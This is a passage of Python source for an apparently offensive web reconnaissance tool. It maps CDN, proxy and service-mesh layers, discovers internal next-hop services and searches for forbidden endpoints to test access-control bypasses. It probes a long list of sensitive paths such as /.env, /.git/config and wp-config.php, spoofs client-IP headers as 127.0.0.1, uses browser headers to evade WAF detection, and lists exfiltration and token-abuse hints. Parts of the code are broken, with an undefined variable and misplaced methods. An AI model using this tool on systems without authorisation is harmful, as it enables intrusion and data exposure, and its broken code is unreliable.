                    probe_response = self._safe_request('GET', probe_url, timeout=3)
                    if probe_response and probe_response.status_code == 200:
                        if mesh in probe_response.text.lower():
                            score_map[mesh] += 4

            # --- Decision ---
            detected = max(score_map.items(), key=lambda x: x[1])
            if detected[1] >= 5:
                mesh_info['service_mesh'] = detected[0]

            # --- Bypass hints ---
            hints = {
                'istio': ['sidecar_bypass', 'outbound_rule_exfiltration', 'cluster_internal'],
                'linkerd': ['l5d_header_injection', 'profile_route_fuzzing'],
                'consul': ['envoy_config_exposure', 'consul_api_token_abuse']
            }

            mesh_info['bypass_hints'] = hints.get(mesh_info['service_mesh'], [])

            return mesh_info

        except Exception as e:
            mesh_info['error'] = str(e)
            return mesh_info


    def _find_next_service(self, service_info: Dict) -> Optional[str]:
        """Intelligent next-hop discovery using multiple detection vectors"""
        next_candidates = set()
        endpoint = service_info.get('endpoint')
        
        if not endpoint:
            return None
        
        try:
            response = self._safe_request('GET', endpoint, timeout=5)
            if not response:
                return None
            
            headers_normalized = self._normalize_headers(response.headers)

            # Method 1: Direct forwarding headers
            forwarding_headers = [
                'X-Forwarded-For', 'X-Upstream-Server', 'X-Backend-Server',
                'X-Real-Backend', 'X-Upstream-Addr', 'X-Forwarded-Proto', 
                'X-Forwarded-Host', 'Front-End-Https', 'Max-Forwards',
                'X-Forwarded-Port', 'Forwarded', 'Via', 'Max-Forwards'
            ]
            
            for header_name, header_value in headers.items():
                if any(fwd_header in header_name for fwd_header in forwarding_headers):
                    # Extract URL or hostname from header
                    if '://' in header_value:
                        next_candidates.add(header_value)
                    elif ':' in header_value:  # hostname:port
                        parsed_current = urlparse(endpoint)
                        next_url = f"{parsed_current.scheme}://{header_value}"
                        next_candidates.add(next_url)
            
            # Method 2: Service mesh upstream discovery
            if service_info.get('service_mesh_info', {}).get('config_access'):
                mesh_endpoints = service_info['service_mesh_info']['config_access']
                
                if '/clusters' in mesh_endpoints:
                    parsed_url = urlparse(endpoint)
                    clusters_url = urljoin(f"{parsed_url.scheme}://{parsed_url.netloc}", '/clusters')
                    clusters_response = self._safe_request('GET', clusters_url, timeout=3)
                    
                    if clusters_response:
                        # Parse Envoy cluster config for upstream services
                        cluster_text = clusters_response.text
                        upstream_matches = re.findall(r'outbound\|\d+\|\|([^:]+)', cluster_text)
                        
                        for upstream in upstream_matches:
                            if upstream != parsed_url.hostname:  # Avoid self-reference
                                next_url = f"{parsed_url.scheme}://{upstream}"
                                next_candidates.add(next_url)
            
            # Method 3: API response analysis for service references
            response_text = response.text
            
            # Look for API endpoints in responses (JSON APIs often reference other services)
            api_url_patterns = [
                r'"[a-zA-Z_]+_url":\s*"(https?://[^"]+)"',
                r'"[a-zA-Z_]+_endpoint":\s*"(https?://[^"]+)"',
                r'"service_url":\s*"(https?://[^"]+)"'
            ]
            
            for pattern in api_url_patterns:
                matches = re.findall(pattern, response_text)
                for match in matches:
                    if match != endpoint:  # Avoid self-reference
                        next_candidates.add(match)
            
            # Method 4: DNS-based service discovery
            parsed_url = urlparse(endpoint)
            if parsed_url.hostname:
                # Try common service discovery patterns
                hostname_parts = parsed_url.hostname.split('.')
                if len(hostname_parts) > 1:
                    # Try different service variations
                    service_variations = [
                        f"api.{'.'.join(hostname_parts[1:])}",
                        f"backend.{'.'.join(hostname_parts[1:])}",
                        f"internal.{'.'.join(hostname_parts[1:])}",
                        f"service.{'.'.join(hostname_parts[1:])}"
                    ]
                    
                    for variation in service_variations:
                        try:
                            # Quick DNS resolution check
                            socket.gethostbyname(variation)
                            next_url = f"{parsed_url.scheme}://{variation}"
                            if next_url != endpoint:
                                next_candidates.add(next_url)
                        except socket.gaierror:
                            continue
            
            # Method 5: Container orchestration service discovery
            container_info = service_info.get('container_info', {})
            if container_info.get('orchestrator') == 'kubernetes':
                # Try Kubernetes internal service patterns
                if '.svc.cluster.local' in parsed_url.hostname:
                    parts = parsed_url.hostname.split('.')
                    if len(parts) >= 3:
                        namespace = parts[1]
                        # Try common service names in the same namespace
                        common_services = ['api', 'backend', 'database', 'cache', 'auth']
                        for service_name in common_services:
                            k8s_url = f"{parsed_url.scheme}://{service_name}.{namespace}.svc.cluster.local"
                            if k8s_url != endpoint:
                                next_candidates.add(k8s_url)
            
            # Return the first valid candidate after basic validation
            for candidate in next_candidates:
                if self._validate_next_hop(candidate):
                    return candidate
            
            return None
            
        except Exception as e:
            return None

    # Helper methods for advanced detection
    def _safe_request(self, method: str, url: str, timeout: int = 5, **kwargs) -> Optional[requests.Response]:
        """Safe HTTP request with error handling"""
        try:
            response = self.session.request(method, url, timeout=timeout, verify=False, **kwargs)
            return response
        except Exception:
            return None

    def _is_rest_api(self, endpoint: str) -> bool:
        """Detect if endpoint is a REST API"""
        try:
            response = self._safe_request('OPTIONS', endpoint, timeout=3)
            if response and 'allow' in response.headers:
                allowed_methods = response.headers['allow'].upper()
                rest_methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
                return sum(1 for method in rest_methods if method in allowed_methods) >= 3
        except:
            pass
        return False

    def _is_graphql(self, endpoint: str) -> bool:
        """Detect GraphQL endpoint"""
        try:
            # Try GraphQL introspection query
            graphql_query = {"query": "{ __schema { types { name } } }"}
            response = self._safe_request('POST', endpoint, json=graphql_query, timeout=3)
            
            if response and response.status_code == 200:
                response_data = response.json()
                return '__schema' in str(response_data)
                
            # Also check for GraphQL-specific paths
            parsed_url = urlparse(endpoint)
            graphql_paths = ['/graphql', '/graphiql', '/api/graphql']
            return any(path in parsed_url.path for path in graphql_paths)
        except:
            pass
        return False

    def _supports_websocket(self, endpoint: str) -> bool:
        """Check WebSocket support"""
        try:
            headers = {
                'Connection': 'Upgrade',
                'Upgrade': 'websocket',
                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                'Sec-WebSocket-Version': '13'
            }
            response = self._safe_request('GET', endpoint, headers=headers, timeout=3)
            return response and response.status_code == 101
        except:
            pass
        return False

    def _validate_next_hop(self, candidate_url: str) -> bool:
        """Advanced validation with service fingerprinting"""
        try:
            # Test con HEAD prima
            head_response = self._safe_request('HEAD', candidate_url, timeout=3)
            
            if head_response and head_response.status_code in [200, 301, 302, 401, 403]:
                return True
            
            # Se HEAD fallisce, prova GET con path generico
            get_response = self._safe_request('GET', candidate_url, timeout=3)
            
            if not get_response:
                return False
            
            # Status codes che indicano servizio esistente
            valid_status_codes = {
                200, 201, 202, 204,  # 2xx Success
                301, 302, 303, 307, 308,  # 3xx Redirect (servizio esiste)
                401, 403, 405, 429  # 4xx selezionati (servizio esiste ma limitato)
            }
            
            # Escludiamo questi status
            invalid_status_codes = {
                404, 410,  # Not found/Gone
                500, 501, 502, 503, 504, 505  # 5xx Server errors
            }

            # Analisi più sofisticata
            service_indicators = [
                # Header che indicano un servizio attivo
                'server', 'x-powered-by', 'x-service-name',
                # Header di sicurezza (indica servizio configurato)
                'x-frame-options', 'x-content-type-options',
                # Header di caching/proxy (indica layer intermedio)
                'cache-control', 'x-cache'
            ]
            
            # Se troviamo header significativi, probabilmente è un servizio
            if any(header in get_response.headers for header in service_indicators):
                return True
            
            # Analisi del contenuto della risposta
            if get_response.text:
                content_indicators = [
                    'api', 'service', 'server', 'application',
                    'version', 'status', 'health'
                ]
                content_lower = get_response.text.lower()
                if any(indicator in content_lower for indicator in content_indicators):
                    return True
            
            # Fallback alla logica originale
            return get_response.status_code < 500
            
        except Exception:
            return False

class ServiceMeshDetector:
    def __init__(self):
        self.mesh_signatures = {
            'istio': ['x-istio-attributes', 'x-envoy', 'x-b3-traceid'],
            'linkerd': ['l5d-dst-service', 'l5d-dst-client'],
            'consul': ['x-consul-token', 'x-consul-index'],
            'traefik': ['x-traefik-router', 'x-traefik-service']
        }

    def detect_mesh(self, headers: Dict, response_info: Dict) -> Dict:
        mesh_data = {
            'type': None,
            'version': None,
            'routing_info': {},
            'metadata': {}
        }
        for mesh_type, signatures in self.mesh_signatures.items():
            if any(sig in str(headers) for sig in signatures):
                mesh_data['type'] = mesh_type
                mesh_data['metadata'] = self._extract_mesh_metadata(mesh_type, headers)
                break
        return mesh_data

    def _extract_mesh_metadata(self, mesh_type: str, headers: Dict) -> Dict:
        metadata = {}
        if mesh_type == 'istio':
            metadata['trace_id'] = headers.get('x-b3-traceid')
            metadata['request_id'] = headers.get('x-request-id')
        elif mesh_type == 'linkerd':
            metadata['dst_service'] = headers.get('l5d-dst-service')
            metadata['dst_client'] = headers.get('l5d-dst-client')
        return metadata

class RequestTracker:
    def __init__(self):
        self.transformations = []
        self.previous_requests = {}  # Store previous request data by request_id
    
    def track_request(self, request_id: str, layer: str, request_data: Dict) -> Dict:
        transformation = {
            'request_id': request_id,
            'layer': layer,
            'timestamp': datetime.utcnow(),
            'headers': request_data.get('headers', {}),
            'payload': request_data.get('payload', {}),
            'mutations': self._analyze_mutations(request_data)
        }
        self.transformations.append(transformation)
        
        # Store current request for future comparison
        self.previous_requests[request_id] = request_data
        
        return transformation
    
    def _analyze_mutations(self, request_data: Dict) -> Dict:
        return {
            'headers_changed': self._detect_header_changes(request_data),
            'payload_modified': self._detect_payload_changes(request_data),
            'encoding_changes': self._detect_encoding_changes(request_data)
        }
    
    def _detect_header_changes(self, request_data: Dict) -> List[str]:
        """
        Rileva i cambiamenti negli header confrontando con le richieste precedenti
        """
        request_id = request_data.get('request_id')
        current_headers = request_data.get('headers', {})
        changes = []
        
        # Se abbiamo una richiesta precedente, confronta gli headers
        if request_id and request_id in self.previous_requests:
            previous_headers = self.previous_requests[request_id].get('headers', {})
            
            # Controlla headers aggiunti o modificati
            for key, value in current_headers.items():
                if key not in previous_headers:
                    changes.append(f"Added header: {key}")
                elif previous_headers[key] != value:
                    changes.append(f"Modified header: {key}")
            
            # Controlla headers rimossi
            for key in previous_headers:
                if key not in current_headers:
                    changes.append(f"Removed header: {key}")
        
        # Controlla per header sospetti o modificazioni comuni
        suspicious_headers = ['x-forwarded-for', 'user-agent', 'authorization', 'cookie']
        for header in suspicious_headers:
            if header.lower() in [h.lower() for h in current_headers.keys()]:
                changes.append(f"Suspicious header present: {header}")
        
        return changes
    
    def _detect_payload_changes(self, request_data: Dict) -> bool:
        """
        Rileva se il payload è stato modificato
        """
        request_id = request_data.get('request_id')
        current_payload = request_data.get('payload', {})
        
        # Se abbiamo una richiesta precedente, confronta i payload
        if request_id and request_id in self.previous_requests:
            previous_payload = self.previous_requests[request_id].get('payload', {})
            return current_payload != previous_payload
        
        return False
    
    def _detect_encoding_changes(self, request_data: Dict) -> List[str]:
        """
        Rileva cambiamenti nell'encoding del payload
        """
        changes = []
        headers = request_data.get('headers', {})
        payload = request_data.get('payload', {})
        
        # Controlla Content-Type per encoding
        content_type = headers.get('content-type', '').lower()
        if 'charset=' in content_type:
            charset = content_type.split('charset=')[1].split(';')[0].strip()
            changes.append(f"Charset detected: {charset}")
        
        # Controlla Content-Encoding
        content_encoding = headers.get('content-encoding', '').lower()
        if content_encoding:
            changes.append(f"Content encoding: {content_encoding}")
        
        # Controlla se il payload sembra essere encoded
        if isinstance(payload, dict):
            for key, value in payload.items():
                if isinstance(value, str):
                    # Controlla per base64
                    if self._is_base64_encoded(value):
                        changes.append(f"Base64 encoded value in field: {key}")
                    
                    # Controlla per URL encoding
                    if self._is_url_encoded(value):
                        changes.append(f"URL encoded value in field: {key}")
                        
                    # Controlla per possibili JSON escaped
                    if value.startswith('{') or value.startswith('['):
                        try:
                            json.loads(value)
                            changes.append(f"JSON string in field: {key}")
                        except:
                            pass
        
        return changes
    
    def _is_base64_encoded(self, value: str) -> bool:
        """Controlla se una stringa potrebbe essere base64"""
        try:
            if len(value) % 4 == 0 and len(value) > 10:
                base64.b64decode(value)
                return True
        except:
            pass
        return False
    
    def _is_url_encoded(self, value: str) -> bool:
        """Controlla se una stringa è URL encoded"""
        decoded = urllib.parse.unquote(value)
        return decoded != value and '%' in value

class PayloadAnalyzer:
    def __init__(self):
        self.mutation_types = ['encoding', 'structure', 'content']
    
    def analyze_mutations(self, original_payload: Dict, modified_payload: Dict) -> Dict:
        mutations = {
            'type': [],
            'changes': [],
            'severity': 'low'
        }
        
        # Controlla cambiamenti strutturali
        if self._check_structural_changes(original_payload, modified_payload):
            mutations['type'].append('structural')
            mutations['severity'] = 'high'
        
        # Controlla cambiamenti di encoding
        encoding_changes = self._check_encoding_changes(original_payload, modified_payload)
        if encoding_changes:
            mutations['type'].append('encoding')
            mutations['changes'].extend(encoding_changes)
            if mutations['severity'] == 'low':
                mutations['severity'] = 'medium'
        
        # Controlla cambiamenti di contenuto
        content_changes = self._check_content_changes(original_payload, modified_payload)
        if content_changes:
            mutations['type'].append('content')
            mutations['changes'].extend(content_changes)
        
        return mutations
    
    def _check_structural_changes(self, original: Dict, modified: Dict) -> bool:
        """
        Controlla se ci sono cambiamenti strutturali significativi
        """
        # Controlla se le chiavi sono cambiate
        original_keys = set(self._get_all_keys(original))
        modified_keys = set(self._get_all_keys(modified))
        
        # Se sono state aggiunte o rimosse chiavi, è un cambiamento strutturale
        if original_keys != modified_keys:
            return True
        
        # Controlla se il tipo di dati è cambiato per le stesse chiavi
        return self._check_type_changes(original, modified)
    
    def _check_encoding_changes(self, original: Dict, modified: Dict) -> List[str]:
        """
        Rileva cambiamenti nell'encoding dei valori
        """
        changes = []
        
        for key in original.keys():
            if key in modified:
                orig_val = str(original[key])
                mod_val = str(modified[key])
                
                # Controlla se un valore è diventato base64
                if not self._is_base64_like(orig_val) and self._is_base64_like(mod_val):
                    changes.append(f"Value '{key}' appears to be base64 encoded")
                
                # Controlla se un valore è stato decodificato
                elif self._is_base64_like(orig_val) and not self._is_base64_like(mod_val):
                    changes.append(f"Value '{key}' appears to be base64 decoded")
                
                # Controlla URL encoding
                if '%' not in orig_val and '%' in mod_val:
                    changes.append(f"Value '{key}' appears to be URL encoded")
                elif '%' in orig_val and '%' not in mod_val:
                    changes.append(f"Value '{key}' appears to be URL decoded")
        
        return changes
    
    def _check_content_changes(self, original: Dict, modified: Dict) -> List[str]:
        """
        Rileva cambiamenti nel contenuto effettivo
        """
        changes = []
        
        for key in original.keys():
            if key in modified:
                if original[key] != modified[key]:
                    changes.append(f"Content changed in field '{key}'")
            else:
                changes.append(f"Field '{key}' was removed")
        
        for key in modified.keys():
            if key not in original:
                changes.append(f"New field '{key}' was added")
        
        return changes
    
    def _get_all_keys(self, data: Dict, prefix: str = "") -> List[str]:
        """
        Ottiene tutte le chiavi in modo ricorsivo per strutture annidate
        """
        keys = []
        for key, value in data.items():
            full_key = f"{prefix}.{key}" if prefix else key
            keys.append(full_key)
            
            if isinstance(value, dict):
                keys.extend(self._get_all_keys(value, full_key))
        
        return keys
    
    def _check_type_changes(self, original: Dict, modified: Dict) -> bool:
        """
        Controlla se il tipo di dati è cambiato per le chiavi comuni
        """
        for key in original.keys():
            if key in modified:
                if type(original[key]) != type(modified[key]):
                    return True
                
                # Controlla ricorsivamente per dict annidati
                if isinstance(original[key], dict) and isinstance(modified[key], dict):
                    if self._check_type_changes(original[key], modified[key]):
                        return True
        
        return False
    
    def _is_base64_like(self, value: str) -> bool:
        """
        Controlla se una stringa assomiglia a base64
        """
        if not isinstance(value, str) or len(value) < 4:
            return False
        
        # Base64 dovrebbe essere divisibile per 4 e contenere solo caratteri validi
        import re
        base64_pattern = re.compile(r'^[A-Za-z0-9+/]*={0,2}$')
        return len(value) % 4 == 0 and base64_pattern.match(value) and len(value) > 10

    def handle_request(self, stack_type: str, request_data: Dict) -> Dict:
        if stack_type in self.known_stacks:
            return self._process_stack_specific(stack_type, request_data)
        return request_data

    def _process_stack_specific(self, stack_type: str, request_data: Dict) -> Dict:
        stack_config = self.known_stacks[stack_type]
        processed_data = request_data.copy()
        # Placeholder for stack-specific logic
        return processed_data

class CommandGenerator:
    def __init__(self, request_data: Dict):
        self.request_data = request_data

    def _ensure_serializable(self, data):
        if isinstance(data, bytes):
            try:
                return data.decode('utf-8')
            except UnicodeDecodeError:
                return base64.b64encode(data).decode('utf-8')
        elif isinstance(data, dict):
            return {k: self._ensure_serializable(v) for k, v in data.items()}
        elif isinstance(data, list):
            return [self._ensure_serializable(item) for item in data]
        return data

    def generate_curl(self) -> str:
        cmd = ['curl']
        for header, value in self.request_data.get('headers', {}).items():
            cmd.append(f'-H "{header}: {value}"')
        if 'payload' in self.request_data:
            serializable_payload = self._ensure_serializable(self.request_data['payload'])
            cmd.append(f"-d '{json.dumps(serializable_payload)}'")
        cmd.append(f"'{self.request_data['url']}'")
        return ' '.join(cmd)

    def generate_python(self) -> str:
        code = [
            'import requests',
            'import json',
            '',
            f"url = '{self.request_data['url']}'",
            f"headers = {json.dumps(self.request_data.get('headers', {}), indent=2)}",
        ]
        if 'payload' in self.request_data:
            # Utilizziamo _ensure_serializable per gestire i dati binari
            serializable_payload = self._ensure_serializable(self.request_data['payload'])
            code.append(f"payload = {json.dumps(serializable_payload, indent=2)}")
            code.append('')
            code.append('response = requests.post(url, headers=headers, json=payload)')
        else:
            code.append('')
            code.append('response = requests.get(url, headers=headers)')
        return '\n'.join(code)

class ApplicationTraceroute:
    def __init__(self, target_url, forbidden_endpoint=None, skip_forbidden_tests=False):
        self.target_url = target_url.rstrip('/')
        self.parsed_url = urlparse(target_url)
        self.session = requests.Session()
        self.service_discovery = ServiceDiscoveryEnhanced()
        self.mesh_detector = ServiceMeshDetector()
        self.request_tracker = RequestTracker()
        self.payload_analyzer = PayloadAnalyzer()
        #self.stack_handler = StackHandler()
        self.command_generator = None     

        # Forbidden endpoint configuration
        self.forbidden_endpoint = forbidden_endpoint
        self.skip_forbidden_tests = skip_forbidden_tests
        self.discovered_forbidden_endpoint = None
        
        # Chain discovery results
        self.chain_map = {
            'layers': [],
            'discrepancies': [],
            'fingerprints': {},
            'bypasses': []
        }
        
        # Protocol support detection
        self.protocols = {
            'http1': True,
            'http2': False,
            'http3': False,
            'websocket': False
        }
        
    def log_discovery(self, layer, discovery_type, details):
        """Log discoveries with structured data"""
        timestamp = time.strftime('%H:%M:%S')
        print(f"[{timestamp}] 🔍 {layer} - {discovery_type}: {details}")
        
        if layer not in self.chain_map['fingerprints']:
            self.chain_map['fingerprints'][layer] = {}
        self.chain_map['fingerprints'][layer][discovery_type] = details

    def generate_unique_markers(self):
        """Generate unique markers for request tracking"""
        return {
            'uuid': ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)),
            'timestamp': str(int(time.time())),
            'sequence': str(random.randint(100000, 999999))
        }

    def find_forbidden_endpoint(self):
        """Find an endpoint that returns 403/401 for bypass testing"""
        print("\n🔍 Phase 0: Finding Forbidden Endpoint for Testing")
        # Browser-like headers per evitare detection WAF/anti-bot
        browser_headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'it,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }

        
        # If specified by user, verify it's actually forbidden
        if self.forbidden_endpoint:
            try:
                # Per cross-domain, aggiungere Referer
                test_headers = browser_headers.copy()
                forbidden_parsed = urlparse(self.forbidden_endpoint)
                if forbidden_parsed.netloc != self.parsed_url.netloc:
                    test_headers['Referer'] = self.target_url

                response = self.session.get(self.forbidden_endpoint, timeout=5)
                if response.status_code in [401, 403]:
                    self.discovered_forbidden_endpoint = self.forbidden_endpoint
                    self.log_discovery("Setup", "Forbidden Endpoint", f"User-provided: {self.forbidden_endpoint} ({response.status_code})")
                    return self.forbidden_endpoint
                else:
                    print(f"  ⚠️ Provided endpoint returned {response.status_code}, not 403/401. Searching for alternatives...")
            except Exception as e:
                print(f"  ⚠️ Error checking provided endpoint: {e}")
        
        # Search for common protected endpoints
        # Extended list of common protected endpoints that typically return 401/403
        common_protected = [
            # Original admin endpoints
            '/admin', '/wp-admin', '/administrator', '/secure', '/api/admin',
            '/manage', '/console', '/portal', '/control', '/private',
            '/restricted', '/staff', '/backend', '/cpanel', '/webadmin',
            
            # Configuration and sensitive files
            '/.env', '/.env.local', '/.env.production', '/.env.backup',
            '/.git', '/.git/config', '/.gitignore', '/.gitlab-ci.yml',
            '/config', '/config.php', '/config.json', '/config.yml',
            '/configuration.php', '/wp-config.php', '/app.config',
            '/.htaccess', '/.htpasswd', '/web.config', '/robots.txt',
            '/sitemap.xml', '/.well-known',
            
            # Database administration
            '/phpmyadmin', '/pma', '/adminer', '/mysql', '/database',
            '/db', '/dbadmin', '/sqlmanager', '/myadmin', '/phpMyAdmin',
            '/mysqladmin', '/sql', '/db_admin', '/database_administration',
            
            # User management and authentication
            '/users', '/user', '/accounts', '/account', '/profile', '/profiles',
            '/login', '/signin', '/auth', '/authentication', '/oauth',
            '/sso', '/saml', '/ldap', '/register', '/signup',
            
            # API endpoints
            '/api', '/api/v1', '/api/v2', '/api/admin', '/api/internal',
            '/api/private', '/api/user', '/api/users', '/api/auth',
            '/api/login', '/api/admin/users', '/api/config', '/api/settings',
            '/graphql', '/graphiql', '/playground', '/altair',
            
            # Content Management Systems (CMS)
            '/wp-admin', '/wp-login.php', '/wp-content', '/wp-includes',
            '/wp-json', '/xmlrpc.php', '/wp-cron.php',
            '/drupal', '/sites/default', '/node', '/user/login',
            '/joomla', '/joomla/administrator', '/typo3', '/umbraco',
            
            # Development and staging
            '/dev', '/development', '/test', '/testing', '/stage', '/staging',
            '/debug', '/trace', '/logs', '/log', '/monitoring',
            '/health', '/status', '/info', '/version', '/build',
            
            # System directories
            '/pages', '/root', '/home', '/var', '/etc', '/tmp',
            '/uploads', '/upload', '/files', '/documents', '/media',
            '/images', '/assets', '/static', '/resources',
            '/includes', '/lib', '/libraries', '/vendor',
            '/cgi-bin', '/cgi', '/bin', '/scripts',
            
            # Backup and archive files
            '/backup', '/backups', '/bak', '/old', '/archive',
            '/dump', '/sql', '/.bak', '/backup.zip', '/backup.tar.gz',
            '/db_backup.sql', '/database.sql', '/data.sql',
            
            # Server status and monitoring
            '/server-status', '/server-info', '/status', '/stats',
            '/metrics', '/health', '/ping', '/heartbeat',
            '/actuator', '/actuator/health', '/actuator/info', '/actuator/metrics',
            '/management', '/jolokia', '/hawtio',
            
            # Framework specific endpoints
            # Spring Boot
            '/actuator', '/actuator/beans', '/actuator/env', '/actuator/configprops',
            '/actuator/mappings', '/actuator/sessions', '/actuator/shutdown',
            '/actuator/trace', '/actuator/dump', '/actuator/jolokia',
            '/actuator/logfile', '/actuator/refresh', '/actuator/restart',
            
            # Django
            '/django-admin', '/__debug__', '/admin/doc', '/admin/auth',
            
            # Laravel
            '/telescope', '/horizon', '/nova', '/log-viewer',
            
            # Node.js/Express
            '/debug', '/_debugger', '/inspector', '/profiler',
            
            # Flask
            '/admin', '/admin/login', '/_debug_toolbar',
            
            # Documentation endpoints
            '/docs', '/doc', '/documentation', '/swagger', '/swagger-ui',
            '/swagger.json', '/swagger.yaml', '/openapi.json',
            '/redoc', '/api-docs', '/apidocs', '/api/docs',
            
            # Security tools and panels
            '/security', '/firewall', '/waf', '/ids', '/ips',
            '/antivirus', '/scanner', '/audit', '/compliance',
            
            # Cloud and container specific
            '/kubernetes', '/k8s', '/docker', '/containers',
            '/pods', '/services', '/ingress', '/metrics-server',
            '/prometheus', '/grafana', '/jaeger', '/zipkin',
            
            # CI/CD and DevOps
            '/jenkins', '/bamboo', '/teamcity', '/gitlab',
            '/github', '/bitbucket', '/azure-devops', '/travis',
            '/circleci', '/drone', '/argo', '/tekton',
            
            # Specific application panels
            '/nagios', '/zabbix', '/cacti', '/munin', '/icinga',
            '/kibana', '/elasticsearch', '/logstash', '/splunk',
            '/sonarqube', '/nexus', '/artifactory', '/harbor',
            
            # E-commerce specific
            '/checkout', '/payment', '/billing', '/invoice',
            '/orders', '/cart', '/wishlist', '/customer',
            '/merchant', '/vendor', '/seller',
            
            # Communication tools
            '/mail', '/webmail', '/roundcube', '/squirrelmail',
            '/horde', '/zimbra', '/exchange', '/outlook',
            '/chat', '/slack', '/teams', '/discord',
            
            # File management
            '/filemanager', '/ftp', '/sftp', '/files', '/explorer',
            '/finder', '/directory', '/browse', '/tree',
            
            # Miscellaneous sensitive paths
            '/internal', '/intranet', '/extranet', '/partner',
            '/client', '/customer', '/member', '/premium',
            '/vip', '/executive', '/board', '/leadership',
            '/hr', '/finance', '/accounting', '/legal',
            
            # Version control and source code
            '/.svn', '/.hg', '/.bzr', '/CVS',
            '/src', '/source', '/sources', '/code',
            
            # Cache and temporary files
            '/cache', '/tmp', '/temp', '/temporary',
            '/session', '/sessions', '/var/cache', '/var/tmp',
            
            # Mobile and API gateways
            '/mobile', '/m', '/api/mobile', '/mobile-api',
            '/gateway', '/proxy', '/reverse-proxy',
            
            # Analytics and tracking
            '/analytics', '/tracking', '/stats', '/reports',
            '/dashboard', '/overview', '/summary',
            
            # Backup services
            '/backup', '/restore', '/snapshot', '/clone',
            '/export', '/import', '/migrate', '/sync',
            
            # Third-party integrations
            '/oauth2', '/openid', '/cas', '/radius',
            '/active-directory', '/ldap', '/saml2',
            '/facebook', '/google', '/twitter', '/linkedin',
            '/github', '/gitlab', '/bitbucket',
            
            # Error and debug pages
            '/error', '/errors', '/404', '/500', '/debug',
            '/trace', '/exception', '/stacktrace',
            
            # Testing and QA
            '/qa', '/quality', '/test-results', '/coverage',
            '/performance', '/load-test', '/stress-test',
            
            # Additional file extensions that might be protected
            '/.DS_Store', '/thumbs.db', '/.vscode', '/.idea',
            '/composer.json', '/package.json', '/yarn.lock',
            '/Gemfile', '/requirements.txt', '/pom.xml',
            '/build.gradle', '/Dockerfile', '/docker-compose.yml'
        ]

        for endpoint in common_protected:
            try:
                url = self.target_url + endpoint
                response = self.session.get(url, headers=browser_headers, timeout=5, allow_redirects=False)
                if response.status_code in [401, 403]:
                    self.discovered_forbidden_endpoint = url
                    self.log_discovery("Setup", "Forbidden Endpoint Found", f"{endpoint} ({response.status_code})")
                    return url
            except:
                continue
        
        # If no forbidden endpoint found
        if not self.skip_forbidden_tests:
            print("  ⚠️ No forbidden endpoint found - some bypass tests will be limited")
            print("  💡 Tip: Use --forbidden-endpoint to specify one, or --skip-forbidden-tests to skip these tests")
        
        return None

    def create_fingerprint_payloads(self):
        """Create payloads to fingerprint unlimited layers in the chain"""
        markers = self.generate_unique_markers()
        
        # Sistema di detection esteso per tutti i possibili layer
        return {
            # Layer 1: Edge/CDN Detection
            # Sistema di detection esteso per tutti i possibili layer
            # Layer 1: Edge/CDN Detection
            'cdn_detection': {
                'priority': 1,
                'headers': {
                    'X-CDN-Test': markers['uuid'],
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'X-Edge-Test': markers['sequence'],
                    'CF-Connecting-IP': f'127.0.0.1',  # Test Cloudflare
                    'X-Forwarded-Proto': 'https',
                    'X-Original-URL': f'/test-{markers["uuid"]}',
                    'True-Client-IP': '127.0.0.1',  # Test Akamai
                    'Fastly-Client-IP': '127.0.0.1',  # Test Fastly
                    'X-Real-IP': '127.0.0.1',
                    'X-Cluster-Client-IP': '127.0.0.1'
                },
                'expected_responses': [
                    # Major Global CDNs
                    'cloudflare', 'cloudfront', 'fastly', 'akamai', 'azure-cdn',
                    'google-cdn', 'google-cloud-cdn', 'amazon-cloudfront',
                    
                    # Popular Commercial CDNs
                    'maxcdn', 'stackpath', 'keycdn', 'bunnycdn', 'quantil',
                    'cdn77', 'jsdelivr', 'unpkg', 'bootstrapcdn', 'cdnjs',
                    
                    # Enterprise CDNs
                    'limelight', 'edgecast', 'level3', 'verizon-cdn', 'att-cdn',
                    'chinacache', 'cachefly', 'highwinds', 'incapsula', 'imperva',
                    
                    # Regional/Specialized CDNs
                    'belugacdn', 'gcore', 'goooood-cdn', 'sucuri', 'swarmify',
                    'rackspace-cdn', 'softlayer-cdn', 'cdnlion', 'alicdn', 'tencent-cdn',
                    
                    # Security-focused CDNs
                    'sucuri-cdn', 'incapsula-cdn', 'imperva-cdn', 'cloudflare-spectrum',
                    'ddos-guard', 'koddos', 'blazingfast', 'ovh-cdn',
                    
                    # Asian CDNs
                    'alicloud-cdn', 'tencent-cloud-cdn', 'baidu-cdn', 'qiniu-cdn',
                    'upyun-cdn', 'chinacache', 'wangsu', 'kingsoft-cdn',
                    'netcenter', 'sina-cdn', 'ksyun-cdn',
                    
                    # European CDNs
                    'ovh-cdn', 'scaleway-cdn', 'hetzner-cdn', 'contabo-cdn',
                    'digitalocean-cdn', 'linode-cdn', 'vultr-cdn',
                    
                    # Emerging/Niche CDNs
                    'section-cdn', 'optimole', 'wp-rocket-cdn', 'jetpack-cdn',
                    'autoptimize-cdn', 'wp-super-cache-cdn', 'w3-total-cache-cdn',
                    
                    # Video/Streaming CDNs
                    'wowza-cdn', 'jwplayer-cdn', 'brightcove-cdn', 'vimeo-cdn',
                    'youtube-cdn', 'twitch-cdn', 'netflix-cdn', 'hulu-cdn',
                    
                    # Government/Enterprise
                    'govcdn', 'milcdn', 'educdn', 'healthcare-cdn',
                    
                    # Open Source/Community
                    'jsdelivr-cdn', 'unpkg-cdn', 'cdnjs-cloudflare', 'github-cdn',
                    'gitlab-cdn', 'raw-githubusercontent'
                ],
                'detection_headers': [
                    # Cloudflare headers
                    'cf-ray', 'cf-cache-status', 'cf-request-id', 'cf-connecting-ip',
                    'cf-visitor', 'cf-ipcountry', 'cf-apo-via', 'expect-ct',
                    
                    # AWS CloudFront headers
                    'x-amz-cf-id', 'x-amz-cf-pop', 'x-cache', 'x-amz-request-id',
                    'x-amzn-trace-id', 'x-amzn-requestid',
                    
                    # Akamai headers
                    'akamai-origin-hop', 'akamai-transformed', 'akamai-cache-status',
